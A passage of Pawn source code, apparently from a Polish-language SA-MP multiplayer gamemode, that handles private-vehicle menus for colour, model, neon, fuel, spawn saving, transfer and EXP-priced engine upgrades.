						   	{
						   	    new Float:x, Float:y, Float:z;
						   	    GetPlayerPos(playerid, x, y, z);
						       	SetVehiclePos(ppVeh[privcarid], x, y, z);
						       	PutPlayerInVehicle(playerid, ppVeh[privcarid], 0);
							}
						}
					}
		           	case 1:
					{
						Loop(privcarid, privcars) {
						   	if(pOwner[privcarid] == Player[playerid][ID]) PutPlayerInVehicle(playerid, ppVeh[privcarid], 0); }
					}
		           	case 2: return ShowPlayerDialog(playerid, DIALOG_PRIVCARKOLOR1, DIALOG_STYLE_INPUT, ""C_BLUE1"Prywatny pojazd - zmiana koloru", ""C_BLUE1"WprowadŸ poni¿ej pierwszy kolor dla Twojego pojazdu.", "Wybierz", "Zamknij");
		           	case 3: return ShowPlayerDialog(playerid, DIALOG_PRIVCARMODEL, DIALOG_STYLE_INPUT, ""C_BLUE1"Prywatny pojazd - zmiana modelu", ""C_BLUE1"WprowadŸ poni¿ej nazwê nowego modelu dla Twojego pojazdu.\n"C_RED"Zmiana modelu kosztuje "C_WHITE"5000 EXP"C_RED".\n{FF0000}Zmiana modelu spowoduje reset ulepszeñ silnika.", "Wybierz", "Zamknij");
					case 4: return ShowPlayerDialog(playerid, DIALOG_PRIVCARNEON, DIALOG_STYLE_LIST, ""C_BLUE1"Prywatny pojazd - neony", "{FF0400}Czerwony\n{007BFF}Niebieski\n{43FF00}Zielony\n{FF3900}¯ó³ty\n{FF00CB}Ró¿owy\n"C_WHITE"Bia³y\n"C_RED"Usuñ", "Wybierz", "Zamknij");
					case 5: return ShowPlayerDialog(playerid, DIALOG_PRIVCARFUEL, DIALOG_STYLE_LIST, ""C_BLUE1"Prywatny pojazd - paliwo", ""C_WHITE"95\t\t\t"C_YELLOW"500 EXP\n"C_WHITE"98\t\t\t"C_YELLOW"1500 EXP\n"C_WHITE"ON\t\t\t"C_YELLOW"3000 EXP\n"C_WHITE"LPG\t\t\t"C_YELLOW"10000 EXP", "Wybierz", "Zamknij");
		           	case 6:
					{
						Loop(privcarid, privcars)
						{
						   	if(!IsPlayerInVehicle(playerid, ppVeh[privcarid]) && pOwner[privcarid] == Player[playerid][ID]) return DialogError(playerid, "{FFFF00}Nie jesteœ w prywatnym pojeŸdzie.");
						   	{
						   	    if(pOwner[privcarid] == Player[playerid][ID])
						   	    {
						   	    	new Float:x, Float:y, Float:z, Float:a;
						   	    	GetPlayerPos(playerid, x, y, z);
						   	    	GetVehicleZAngle(ppVeh[privcarid], a);
	       	 						prX[privcarid] = x;
	       	 						prY[privcarid] = y;
	       	 						prZ[privcarid] = z;
	       	 						prA[privcarid] = a;
	       	 						SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Spawn prywatnego pojazdu zapisany w tym miejscu.");
								}
							}
						}
					}
					case 7: return ShowPlayerDialog(playerid, DIALOG_PRIVCARTAKE, DIALOG_STYLE_INPUT, ""C_BLUE1"Oddaj prywatny pojazd", ""C_WHITE"Wpisz ID gracza, któremu chcesz oddaæ Swój pojazd.", "Wybierz", "Zamknij");
					case 8: return ShowPlayerDialog(playerid, DIALOG_PRIVCAROFFER, DIALOG_STYLE_INPUT, ""C_BLUE1"Z³o¿ ofertê sprzeda¿y", ""C_WHITE"Wpisz ID gracza, któremu chcesz sprzedaæ Swój pojazd.", "Wybierz", "Zamknij");
					case 9:
					{
						Loop(privcarid, privcars)
						{
						   	if(!IsPlayerInVehicle(playerid, ppVeh[privcarid]) && pOwner[privcarid] == Player[playerid][ID]) return DialogError(playerid, "{FFFF00}Nie jesteœ w prywatnym pojeŸdzie.");
						   	{
						   	    if(pOwner[privcarid] == Player[playerid][ID])
						   	    {
						   	        if(pUpgrade[privcarid] > 2) return SendClientMessage(playerid, RED, ""C_RED"Posiadasz ju¿ maksymalne ulepszenie silnika w tym pojeŸdzie.");
									new s[1024];
									format(s, sizeof(s), ""C_WHITE"Planujesz zakupiæ ulepszenie silnika "C_YELLOW"%d/3 "C_WHITE"dla swojego prywatnego pojazdu.\n\n", pUpgrade[privcarid] + 1);
									if(pUpgrade[privcarid] == 0) format(s, sizeof(s), "%s"C_WHITE"Kupno tego ulepszenia wyniesie Ciê "C_YELLOW"10000 "C_WHITE"EXP.\n\n", s);
									if(pUpgrade[privcarid] == 1) format(s, sizeof(s), "%s"C_WHITE"Kupno tego ulepszenia wyniesie Ciê "C_YELLOW"25000 "C_WHITE"EXP.\n\n", s);
									if(pUpgrade[privcarid] == 2) format(s, sizeof(s), "%s"C_WHITE"Kupno tego ulepszenia wyniesie Ciê "C_YELLOW"50000 "C_WHITE"EXP.\n\n", s);
									format(s, sizeof(s), "%sZakupiæ to ulepszenie?", s);
									return ShowPlayerDialog(playerid, DIALOG_PRIVCARENGINE, DIALOG_STYLE_MSGBOX, ""C_BLUE1"Ulepszenie silnika", s, "Kup", "Anuluj");
						   	    }
						   	}
						}
					}
		    	}
			}
		}
		case DIALOG_PRIVCARENGINE:
		{
		    if(response)
		    {
				Loop(privcarid, privcars)
				{
				   	if(!IsPlayerInVehicle(playerid, ppVeh[privcarid]) && pOwner[privcarid] == Player[playerid][ID]) return DialogError(playerid, "{FFFF00}Nie jesteœ w prywatnym pojeŸdzie.");
				   	{
				   	    if(pOwner[privcarid] == Player[playerid][ID])
				   	    {
				   	        if(pUpgrade[privcarid] > 2) return SendClientMessage(playerid, RED, ""C_RED"Posiadasz ju¿ maksymalne ulepszenie silnika w tym pojeŸdzie.");
							if(pUpgrade[privcarid] == 0)
							{
							    if(Player[playerid][Exp] < 10000) return SendClientMessage(playerid, RED, "Nie posiadasz wystarczaj¹cej iloœci EXP.");
								Player[playerid][Exp] -= 10000;
								pUpgrade[privcarid] = 1;
				   	    		new s[1024], comp[14];
    							if(pNeon[privcarid] == 0) {
						    		DestroyObject(pObject[privcarid][0]);
						    		DestroyObject(pObject[privcarid][1]); }
								if(pNeon[privcarid] == 1) {
						    		DestroyObject(pObject[privcarid][2]);
						    		DestroyObject(pObject[privcarid][3]); }
								if(pNeon[privcarid] == 2) {
						    		DestroyObject(pObject[privcarid][4]);
						    		DestroyObject(pObject[privcarid][5]); }
								if(pNeon[privcarid] == 3) {
						    		DestroyObject(pObject[privcarid][6]);
						    		DestroyObject(pObject[privcarid][7]); }
								if(pNeon[privcarid] == 4) {
						    		DestroyObject(pObject[privcarid][8]);
						    		DestroyObject(pObject[privcarid][9]); }
								if(pNeon[privcarid] == 5) {
						    		DestroyObject(pObject[privcarid][10]);
						    		DestroyObject(pObject[privcarid][11]); }
								DestroyVehicle(ppVeh[privcarid]);
								Delete3DTextLabel(pText[privcarid]);
								ppVeh[privcarid] = CreateVehicle(pModel[privcarid], prX[privcarid], prY[privcarid], prZ[privcarid], prA[privcarid], pColor[privcarid][0], pColor[privcarid][1], -1, 0);
								new tdstr[256];
								if(pFuelT[privcarid] == 0) format(tdstr,sizeof(tdstr), "{CD82F5}%s, {65D2A9}%d\n{FFFF00}%.1fL {CD82F5}(95, U%d)\n"C_NICK"%.1fkm", pOwnerN[privcarid], privcarid, pFuel[privcarid], pUpgrade[privcarid], pDist[privcarid]);
								if(pFuelT[privcarid] == 1) format(tdstr,sizeof(tdstr), "{CD82F5}%s, {65D2A9}%d\n{FFFF00}%.1fL {CD82F5}(98, U%d)\n"C_NICK"%.1fkm", pOwnerN[privcarid], privcarid, pFuel[privcarid], pUpgrade[privcarid], pDist[privcarid]);
								if(pFuelT[privcarid] == 2) format(tdstr,sizeof(tdstr), "{CD82F5}%s, {65D2A9}%d\n{FFFF00}%.1fL {CD82F5}(ON, U%d)\n"C_NICK"%.1fkm", pOwnerN[privcarid], privcarid, pFuel[privcarid], pUpgrade[privcarid], pDist[privcarid]);
								if(pFuelT[privcarid] == 3) format(tdstr,sizeof(tdstr), "{CD82F5}%s, {65D2A9}%d\n{FFFF00}%.1fL {CD82F5}(LPG, U%d)\n"C_NICK"%.1fkm", pOwnerN[privcarid], privcarid, pFuel[privcarid], pUpgrade[privcarid], pDist[privcarid]);
								pText[privcarid] = Create3DTextLabel(tdstr, WHITE, 0.0, 0.0, 0.0, 30.0, 0, 0);
								Attach3DTextLabelToVehicle(pText[privcarid], ppVeh[privcarid], 0.0, 0.0, 0.0);
								m_query("SELECT comp FROM privcars WHERE cid = %d", privcarid);
								mysql_store_result();
								mysql_fetch_row(s, " ");
								mysql_free_result();
								sscanf(s, "a<i>[14]",comp);
								addVehicleComponent(ppVeh[privcarid], comp[0], comp[1], comp[2], comp[3], comp[4], comp[5], comp[6], comp[7], comp[8], comp[9], comp[10], comp[11], comp[12], comp[13]);
                           		SetPrivcarHandling(privcarid);
								if(pNeon[privcarid] == 0) {
		   		 					new Float:px, Float:py, Float:pz, Float:prx, Float:pry, Float:prz;
									new Float:x, Float:y, Float:z, Float:z_angle;
                					GetVehiclePos(ppVeh[privcarid],Float:x,Float:y,Float:z);
                					GetVehicleZAngle(ppVeh[privcarid],Float:z_angle);
				           			pObject[privcarid][0] = CreateObject(18647,px,py,pz,prx,pry,prz,10);
            						pObject[privcarid][1] = CreateObject(18647,px,py,pz,prx,pry,prz,10);
               						AttachObjectToVehicle(pObject[privcarid][0],ppVeh[privcarid],0.9004, 0.1164, -0.4655,0);
           							AttachObjectToVehicle(pObject[privcarid][1],ppVeh[privcarid],-0.8706, 0.0570, -0.4655,0); }
								if(pNeon[privcarid] == 1) {
                		    		new Float:px, Float:py, Float:pz, Float:prx, Float:pry, Float:prz;
									new Float:x, Float:y, Float:z, Float:z_angle;
                					GetVehiclePos(ppVeh[privcarid],Float:x,Float:y,Float:z);
                					GetVehicleZAngle(ppVeh[privcarid],Float:z_angle);
				           			pObject[privcarid][0] = CreateObject(18648,px,py,pz,prx,pry,prz,10);
            						pObject[privcarid][1] = CreateObject(18648,px,py,pz,prx,pry,prz,10);
               						AttachObjectToVehicle(pObject[privcarid][0],ppVeh[privcarid],0.9004, 0.1164, -0.4655,0);
              						AttachObjectToVehicle(pObject[privcarid][1],ppVeh[privcarid],-0.8706, 0.0570, -0.4655,0); }
								if(pNeon[privcarid] == 2) {
                		    		new Float:px, Float:py, Float:pz, Float:prx, Float:pry, Float:prz;
									new Float:x, Float:y, Float:z, Float:z_angle;
                					GetVehiclePos(ppVeh[privcarid],Float:x,Float:y,Float:z);
                					GetVehicleZAngle(ppVeh[privcarid],Float:z_angle);
				           			pObject[privcarid][0] = CreateObject(18649,px,py,pz,prx,pry,prz,10);
            						pObject[privcarid][1] = CreateObject(18649,px,py,pz,prx,pry,prz,10);
               						AttachObjectToVehicle(pObject[privcarid][0],ppVeh[privcarid],0.9004, 0.1164, -0.4655,0);
              						AttachObjectToVehicle(pObject[privcarid][1],ppVeh[privcarid],-0.8706, 0.0570, -0.4655,0); }
								if(pNeon[privcarid] == 3) {
                		    		new Float:px, Float:py, Float:pz, Float:prx, Float:pry, Float:prz;
									new Float:x, Float:y, Float:z, Float:z_angle;
                					GetVehiclePos(ppVeh[privcarid],Float:x,Float:y,Float:z);
                					GetVehicleZAngle(ppVeh[privcarid],Float:z_angle);
				           			pObject[privcarid][0] = CreateObject(18650,px,py,pz,prx,pry,prz,10);
            						pObject[privcarid][1] = CreateObject(18650,px,py,pz,prx,pry,prz,10);
               						AttachObjectToVehicle(pObject[privcarid][0],ppVeh[privcarid],0.9004, 0.1164, -0.4655,0);
              						AttachObjectToVehicle(pObject[privcarid][1],ppVeh[privcarid],-0.8706, 0.0570, -0.4655,0); }
								if(pNeon[privcarid] == 4) {
		   		 					new Float:px, Float:py, Float:pz, Float:prx, Float:pry, Float:prz;
									new Float:x, Float:y, Float:z, Float:z_angle;
                					GetVehiclePos(ppVeh[privcarid],Float:x,Float:y,Float:z);
                					GetVehicleZAngle(ppVeh[privcarid],Float:z_angle);
				           			pObject[privcarid][0] = CreateObject(18651,px,py,pz,prx,pry,prz,10);
            						pObject[privcarid][1] = CreateObject(18651,px,py,pz,prx,pry,prz,10);
               						AttachObjectToVehicle(pObject[privcarid][0],ppVeh[privcarid],0.9004, 0.1164, -0.4655,0);
              						AttachObjectToVehicle(pObject[privcarid][1],ppVeh[privcarid],-0.8706, 0.0570, -0.4655,0); }
								if(pNeon[privcarid] == 5) {
                		    		new Float:px, Float:py, Float:pz, Float:prx, Float:pry, Float:prz;
									new Float:x, Float:y, Float:z, Float:z_angle;
                					GetVehiclePos(ppVeh[privcarid],Float:x,Float:y,Float:z);
                					GetVehicleZAngle(ppVeh[privcarid],Float:z_angle);
				           			pObject[privcarid][0] = CreateObject(18652,px,py,pz,prx,pry,prz,10);
            						pObject[privcarid][1] = CreateObject(18652,px,py,pz,prx,pry,prz,10);
               						AttachObjectToVehicle(pObject[privcarid][0],ppVeh[privcarid],0.9004, 0.1164, -0.4655,0);
              						AttachObjectToVehicle(pObject[privcarid][1],ppVeh[privcarid],-0.8706, 0.0570, -0.4655,0); }
								PutPlayerInVehicle(playerid, ppVeh[privcarid], 0);
								PlayerPlaySound(playerid,1133,0.0,0.0,0.0);
								return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Ulepszenie silnika zakupione i zamontowane.");
							}
							if(pUpgrade[privcarid] == 1)
							{
							    if(Player[playerid][Exp] < 25000) return SendClientMessage(playerid, RED, "Nie posiadasz wystarczaj¹cej iloœci EXP.");
								Player[playerid][Exp] -= 25000;
								pUpgrade[privcarid] = 2;
				   	    		new s[1024], comp[14];
    							if(pNeon[privcarid] == 0) {
						    		DestroyObject(pObject[privcarid][0]);
						    		DestroyObject(pObject[privcarid][1]); }
								if(pNeon[privcarid] == 1) {
						    		DestroyObject(pObject[privcarid][2]);
						    		DestroyObject(pObject[privcarid][3]); }
								if(pNeon[privcarid] == 2) {
						    		DestroyObject(pObject[privcarid][4]);
						    		DestroyObject(pObject[privcarid][5]); }
								if(pNeon[privcarid] == 3) {
						    		DestroyObject(pObject[privcarid][6]);
						    		DestroyObject(pObject[privcarid][7]); }
								if(pNeon[privcarid] == 4) {
						    		DestroyObject(pObject[privcarid][8]);
						    		DestroyObject(pObject[privcarid][9]); }
								if(pNeon[privcarid] == 5) {
						    		DestroyObject(pObject[privcarid][10]);
						    		DestroyObject(pObject[privcarid][11]); }
								DestroyVehicle(ppVeh[privcarid]);
								Delete3DTextLabel(pText[privcarid]);
								ppVeh[privcarid] = CreateVehicle(pModel[privcarid], prX[privcarid], prY[privcarid], prZ[privcarid], prA[privcarid], pColor[privcarid][0], pColor[privcarid][1], -1, 0);
								new tdstr[256];
								if(pFuelT[privcarid] == 0) format(tdstr,sizeof(tdstr), "{CD82F5}%s, {65D2A9}%d\n{FFFF00}%.1fL {CD82F5}(95, U%d)\n"C_NICK"%.1fkm", pOwnerN[privcarid], privcarid, pFuel[privcarid], pUpgrade[privcarid], pDist[privcarid]);
								if(pFuelT[privcarid] == 1) format(tdstr,sizeof(tdstr), "{CD82F5}%s, {65D2A9}%d\n{FFFF00}%.1fL {CD82F5}(98, U%d)\n"C_NICK"%.1fkm", pOwnerN[privcarid], privcarid, pFuel[privcarid], pUpgrade[privcarid], pDist[privcarid]);
								if(pFuelT[privcarid] == 2) format(tdstr,sizeof(tdstr), "{CD82F5}%s, {65D2A9}%d\n{FFFF00}%.1fL {CD82F5}(ON, U%d)\n"C_NICK"%.1fkm", pOwnerN[privcarid], privcarid, pFuel[privcarid], pUpgrade[privcarid], pDist[privcarid]);
								if(pFuelT[privcarid] == 3) format(tdstr,sizeof(tdstr), "{CD82F5}%s, {65D2A9}%d\n{FFFF00}%.1fL {CD82F5}(LPG, U%d)\n"C_NICK"%.1fkm", pOwnerN[privcarid], privcarid, pFuel[privcarid], pUpgrade[privcarid], pDist[privcarid]);
								pText[privcarid] = Create3DTextLabel(tdstr, WHITE, 0.0, 0.0, 0.0, 30.0, 0, 0);
								Attach3DTextLabelToVehicle(pText[privcarid], ppVeh[privcarid], 0.0, 0.0, 0.0);
								m_query("SELECT comp FROM privcars WHERE cid = %d", privcarid);
								mysql_store_result();
								mysql_fetch_row(s, " ");
								mysql_free_result();
								sscanf(s, "a<i>[14]",comp);
								addVehicleComponent(ppVeh[privcarid], comp[0], comp[1], comp[2], comp[3], comp[4], comp[5], comp[6], comp[7], comp[8], comp[9], comp[10], comp[11], comp[12], comp[13]);
                           		SetPrivcarHandling(privcarid);
								if(pNeon[privcarid] == 0) {
		   		 					new Float:px, Float:py, Float:pz, Float:prx, Float:pry, Float:prz;
									new Float:x, Float:y, Float:z, Float:z_angle;
                					GetVehiclePos(ppVeh[privcarid],Float:x,Float:y,Float:z);
                					GetVehicleZAngle(ppVeh[privcarid],Float:z_angle);
				           			pObject[privcarid][0] = CreateObject(18647,px,py,pz,prx,pry,prz,10);
            						pObject[privcarid][1] = CreateObject(18647,px,py,pz,prx,pry,prz,10);
               						AttachObjectToVehicle(pObject[privcarid][0],ppVeh[privcarid],0.9004, 0.1164, -0.4655,0);
           							AttachObjectToVehicle(pObject[privcarid][1],ppVeh[privcarid],-0.8706, 0.0570, -0.4655,0); }
								if(pNeon[privcarid] == 1) {
                		    		new Float:px, Float:py, Float:pz, Float:prx, Float:pry, Float:prz;
									new Float:x, Float:y, Float:z, Float:z_angle;
                					GetVehiclePos(ppVeh[privcarid],Float:x,Float:y,Float:z);
                					GetVehicleZAngle(ppVeh[privcarid],Float:z_angle);
				           			pObject[privcarid][0] = CreateObject(18648,px,py,pz,prx,pry,prz,10);
            						pObject[privcarid][1] = CreateObject(18648,px,py,pz,prx,pry,prz,10);
               						AttachObjectToVehicle(pObject[privcarid][0],ppVeh[privcarid],0.9004, 0.1164, -0.4655,0);
              						AttachObjectToVehicle(pObject[privcarid][1],ppVeh[privcarid],-0.8706, 0.0570, -0.4655,0); }
								if(pNeon[privcarid] == 2) {
                		    		new Float:px, Float:py, Float:pz, Float:prx, Float:pry, Float:prz;
									new Float:x, Float:y, Float:z, Float:z_angle;
                					GetVehiclePos(ppVeh[privcarid],Float:x,Float:y,Float:z);
                					GetVehicleZAngle(ppVeh[privcarid],Float:z_angle);
				           			pObject[privcarid][0] = CreateObject(18649,px,py,pz,prx,pry,prz,10);
            						pObject[privcarid][1] = CreateObject(18649,px,py,pz,prx,pry,prz,10);
               						AttachObjectToVehicle(pObject[privcarid][0],ppVeh[privcarid],0.9004, 0.1164, -0.4655,0);
              						AttachObjectToVehicle(pObject[privcarid][1],ppVeh[privcarid],-0.8706, 0.0570, -0.4655,0); }
								if(pNeon[privcarid] == 3) {
                		    		new Float:px, Float:py, Float:pz, Float:prx, Float:pry, Float:prz;
									new Float:x, Float:y, Float:z, Float:z_angle;
                					GetVehiclePos(ppVeh[privcarid],Float:x,Float:y,Float:z);
                					GetVehicleZAngle(ppVeh[privcarid],Float:z_angle);
				           			pObject[privcarid][0] = CreateObject(18650,px,py,pz,prx,pry,prz,10);
            						pObject[privcarid][1] = CreateObject(18650,px,py,pz,prx,pry,prz,10);
               						AttachObjectToVehicle(pObject[privcarid][0],ppVeh[privcarid],0.9004, 0.1164, -0.4655,0);
              						AttachObjectToVehicle(pObject[privcarid][1],ppVeh[privcarid],-0.8706, 0.0570, -0.4655,0); }
								if(pNeon[privcarid] == 4) {
		   		 					new Float:px, Float:py, Float:pz, Float:prx, Float:pry, Float:prz;
									new Float:x, Float:y, Float:z, Float:z_angle;
                					GetVehiclePos(ppVeh[privcarid],Float:x,Float:y,Float:z);
                					GetVehicleZAngle(ppVeh[privcarid],Float:z_angle);
				           			pObject[privcarid][0] = CreateObject(18651,px,py,pz,prx,pry,prz,10);
            						pObject[privcarid][1] = CreateObject(18651,px,py,pz,prx,pry,prz,10);
               						AttachObjectToVehicle(pObject[privcarid][0],ppVeh[privcarid],0.9004, 0.1164, -0.4655,0);
              						AttachObjectToVehicle(pObject[privcarid][1],ppVeh[privcarid],-0.8706, 0.0570, -0.4655,0); }
								if(pNeon[privcarid] == 5) {
                		    		new Float:px, Float:py, Float:pz, Float:prx, Float:pry, Float:prz;
									new Float:x, Float:y, Float:z, Float:z_angle;
                					GetVehiclePos(ppVeh[privcarid],Float:x,Float:y,Float:z);
                					GetVehicleZAngle(ppVeh[privcarid],Float:z_angle);
				           			pObject[privcarid][0] = CreateObject(18652,px,py,pz,prx,pry,prz,10);
            						pObject[privcarid][1] = CreateObject(18652,px,py,pz,prx,pry,prz,10);
               						AttachObjectToVehicle(pObject[privcarid][0],ppVeh[privcarid],0.9004, 0.1164, -0.4655,0);
              						AttachObjectToVehicle(pObject[privcarid][1],ppVeh[privcarid],-0.8706, 0.0570, -0.4655,0); }
								PutPlayerInVehicle(playerid, ppVeh[privcarid], 0);
								PlayerPlaySound(playerid,1133,0.0,0.0,0.0);
								return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Ulepszenie silnika zakupione i zamontowane.");
							}
							if(pUpgrade[privcarid] == 2)
							{
							    if(Player[playerid][Exp] < 50000) return SendClientMessage(playerid, RED, "Nie posiadasz wystarczaj¹cej iloœci EXP.");
								Player[playerid][Exp] -= 50000;
								pUpgrade[privcarid] = 3;
				   	    		new s[1024], comp[14];
    							if(pNeon[privcarid] == 0) {
						    		DestroyObject(pObject[privcarid][0]);
						    		DestroyObject(pObject[privcarid][1]); }
								if(pNeon[privcarid] == 1) {
						    		DestroyObject(pObject[privcarid][2]);
						    		DestroyObject(pObject[privcarid][3]); }
								if(pNeon[privcarid] == 2) {
						    		DestroyObject(pObject[privcarid][4]);
						    		DestroyObject(pObject[privcarid][5]); }
								if(pNeon[privcarid] == 3) {
						    		DestroyObject(pObject[privcarid][6]);
						    		DestroyObject(pObject[privcarid][7]); }
								if(pNeon[privcarid] == 4) {
						    		DestroyObject(pObject[privcarid][8]);
						    		DestroyObject(pObject[privcarid][9]); }
								if(pNeon[privcarid] == 5) {
						    		DestroyObject(pObject[privcarid][10]);
						    		DestroyObject(pObject[privcarid][11]); }
								DestroyVehicle(ppVeh[privcarid]);
								Delete3DTextLabel(pText[privcarid]);
								ppVeh[privcarid] = CreateVehicle(pModel[privcarid], prX[privcarid], prY[privcarid], prZ[privcarid], prA[privcarid], pColor[privcarid][0], pColor[privcarid][1], -1, 0);
								new tdstr[256];
								if(pFuelT[privcarid] == 0) format(tdstr,sizeof(tdstr), "{CD82F5}%s, {65D2A9}%d\n{FFFF00}%.1fL {CD82F5}(95, U%d)\n"C_NICK"%.1fkm", pOwnerN[privcarid], privcarid, pFuel[privcarid], pUpgrade[privcarid], pDist[privcarid]);
								if(pFuelT[privcarid] == 1) format(tdstr,sizeof(tdstr), "{CD82F5}%s, {65D2A9}%d\n{FFFF00}%.1fL {CD82F5}(98, U%d)\n"C_NICK"%.1fkm", pOwnerN[privcarid], privcarid, pFuel[privcarid], pUpgrade[privcarid], pDist[privcarid]);
								if(pFuelT[privcarid] == 2) format(tdstr,sizeof(tdstr), "{CD82F5}%s, {65D2A9}%d\n{FFFF00}%.1fL {CD82F5}(ON, U%d)\n"C_NICK"%.1fkm", pOwnerN[privcarid], privcarid, pFuel[privcarid], pUpgrade[privcarid], pDist[privcarid]);
								if(pFuelT[privcarid] == 3) format(tdstr,sizeof(tdstr), "{CD82F5}%s, {65D2A9}%d\n{FFFF00}%.1fL {CD82F5}(LPG, U%d)\n"C_NICK"%.1fkm", pOwnerN[privcarid], privcarid, pFuel[privcarid], pUpgrade[privcarid], pDist[privcarid]);
								pText[privcarid] = Create3DTextLabel(tdstr, WHITE, 0.0, 0.0, 0.0, 30.0, 0, 0);
								Attach3DTextLabelToVehicle(pText[privcarid], ppVeh[privcarid], 0.0, 0.0, 0.0);
								m_query("SELECT comp FROM privcars WHERE cid = %d", privcarid);
								mysql_store_result();
								mysql_fetch_row(s, " ");
								mysql_free_result();
								sscanf(s, "a<i>[14]",comp);
								addVehicleComponent(ppVeh[privcarid], comp[0], comp[1], comp[2], comp[3], comp[4], comp[5], comp[6], comp[7], comp[8], comp[9], comp[10], comp[11], comp[12], comp[13]);
                           		SetPrivcarHandling(privcarid);
								if(pNeon[privcarid] == 0) {
		   		 					new Float:px, Float:py, Float:pz, Float:prx, Float:pry, Float:prz;
									new Float:x, Float:y, Float:z, Float:z_angle;
                					GetVehiclePos(ppVeh[privcarid],Float:x,Float:y,Float:z);
                					GetVehicleZAngle(ppVeh[privcarid],Float:z_angle);
				           			pObject[privcarid][0] = CreateObject(18647,px,py,pz,prx,pry,prz,10);
            						pObject[privcarid][1] = CreateObject(18647,px,py,pz,prx,pry,prz,10);
               						AttachObjectToVehicle(pObject[privcarid][0],ppVeh[privcarid],0.9004, 0.1164, -0.4655,0);
           							AttachObjectToVehicle(pObject[privcarid][1],ppVeh[privcarid],-0.8706, 0.0570, -0.4655,0); }
								if(pNeon[privcarid] == 1) {
                		    		new Float:px, Float:py, Float:pz, Float:prx, Float:pry, Float:prz;
									new Float:x, Float:y, Float:z, Float:z_angle;
                					GetVehiclePos(ppVeh[privcarid],Float:x,Float:y,Float:z);
                					GetVehicleZAngle(ppVeh[privcarid],Float:z_angle);
				           			pObject[privcarid][0] = CreateObject(18648,px,py,pz,prx,pry,prz,10);
            						pObject[privcarid][1] = CreateObject(18648,px,py,pz,prx,pry,prz,10);
               						AttachObjectToVehicle(pObject[privcarid][0],ppVeh[privcarid],0.9004, 0.1164, -0.4655,0);
              						AttachObjectToVehicle(pObject[privcarid][1],ppVeh[privcarid],-0.8706, 0.0570, -0.4655,0); }
								if(pNeon[privcarid] == 2) {
                		    		new Float:px, Float:py, Float:pz, Float:prx, Float:pry, Float:prz;
									new Float:x, Float:y, Float:z, Float:z_angle;
                					GetVehiclePos(ppVeh[privcarid],Float:x,Float:y,Float:z);
                					GetVehicleZAngle(ppVeh[privcarid],Float:z_angle);
				           			pObject[privcarid][0] = CreateObject(18649,px,py,pz,prx,pry,prz,10);
            						pObject[privcarid][1] = CreateObject(18649,px,py,pz,prx,pry,prz,10);
               						AttachObjectToVehicle(pObject[privcarid][0],ppVeh[privcarid],0.9004, 0.1164, -0.4655,0);
              						AttachObjectToVehicle(pObject[privcarid][1],ppVeh[privcarid],-0.8706, 0.0570, -0.4655,0); }
								if(pNeon[privcarid] == 3) {
                		    		new Float:px, Float:py, Float:pz, Float:prx, Float:pry, Float:prz;
									new Float:x, Float:y, Float:z, Float:z_angle;
                					GetVehiclePos(ppVeh[privcarid],Float:x,Float:y,Float:z);
                					GetVehicleZAngle(ppVeh[privcarid],Float:z_angle);
				           			pObject[privcarid][0] = CreateObject(18650,px,py,pz,prx,pry,prz,10);
            						pObject[privcarid][1] = CreateObject(18650,px,py,pz,prx,pry,prz,10);
               						AttachObjectToVehicle(pObject[privcarid][0],ppVeh[privcarid],0.9004, 0.1164, -0.4655,0);
              						AttachObjectToVehicle(pObject[privcarid][1],ppVeh[privcarid],-0.8706, 0.0570, -0.4655,0); }
								if(pNeon[privcarid] == 4) {
		   		 					new Float:px, Float:py, Float:pz, Float:prx, Float:pry, Float:prz;
									new Float:x, Float:y, Float:z, Float:z_angle;
                					GetVehiclePos(ppVeh[privcarid],Float:x,Float:y,Float:z);
                					GetVehicleZAngle(ppVeh[privcarid],Float:z_angle);
				           			pObject[privcarid][0] = CreateObject(18651,px,py,pz,prx,pry,prz,10);
            						pObject[privcarid][1] = CreateObject(18651,px,py,pz,prx,pry,prz,10);
               						AttachObjectToVehicle(pObject[privcarid][0],ppVeh[privcarid],0.9004, 0.1164, -0.4655,0);
              						AttachObjectToVehicle(pObject[privcarid][1],ppVeh[privcarid],-0.8706, 0.0570, -0.4655,0); }
								if(pNeon[privcarid] == 5) {
                		    		new Float:px, Float:py, Float:pz, Float:prx, Float:pry, Float:prz;
									new Float:x, Float:y, Float:z, Float:z_angle;
                					GetVehiclePos(ppVeh[privcarid],Float:x,Float:y,Float:z);
                					GetVehicleZAngle(ppVeh[privcarid],Float:z_angle);
				           			pObject[privcarid][0] = CreateObject(18652,px,py,pz,prx,pry,prz,10);
            						pObject[privcarid][1] = CreateObject(18652,px,py,pz,prx,pry,prz,10);
               						AttachObjectToVehicle(pObject[privcarid][0],ppVeh[privcarid],0.9004, 0.1164, -0.4655,0);
              						AttachObjectToVehicle(pObject[privcarid][1],ppVeh[privcarid],-0.8706, 0.0570, -0.4655,0); }
								PutPlayerInVehicle(playerid, ppVeh[privcarid], 0);
								PlayerPlaySound(playerid,1133,0.0,0.0,0.0);
								return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Ulepszenie silnika zakupione i zamontowane.");
							}
				 	    }
					}
				}
		    }
		}
		case DIALOG_PRIVCARNEON:
		{
	    	if(!response) return 1;
	     	if(response)
		   	{
				new selprivcar;
				Loop(privcarid, privcars) { if(pOwner[privcarid] == Player[playerid][ID]) selprivcar = privcarid; }
		       	switch(listitem)
		       	{
            		case 0:
            		{
            		    if(pNeon[selprivcar] != -1) return SendClientMessage(playerid, RED, "Zdejmij aktualne neony przed za³o¿eniem nowych.");
            		    new Float:px, Float:py, Float:pz, Float:prx, Float:pry, Float:prz;
						new Float:x, Float:y, Float:z, Float:z_angle;
               			GetVehiclePos(ppVeh[selprivcar],Float:x,Float:y,Float:z);
              			GetVehicleZAngle(ppVeh[selprivcar],Float:z_angle);
           				pObject[selprivcar][0] = CreateObject(18647,px,py,pz,prx,pry,prz,10);
            			pObject[selprivcar][1] = CreateObject(18647,px,py,pz,prx,pry,prz,10);
               			AttachObjectToVehicle(pObject[selprivcar][0],ppVeh[selprivcar],0.9004, 0.1164, -0.4655,0);
              			AttachObjectToVehicle(pObject[selprivcar][1],ppVeh[selprivcar],-0.8706, 0.0570, -0.4655,0);
              			pNeon[selprivcar] = 0;
   					}
    			 	case 1:
            		{
            		    if(pNeon[selprivcar] != -1) return SendClientMessage(playerid, RED, "Zdejmij aktualne neony przed za³o¿eniem nowych.");
            		    new Float:px, Float:py, Float:pz, Float:prx, Float:pry, Float:prz;
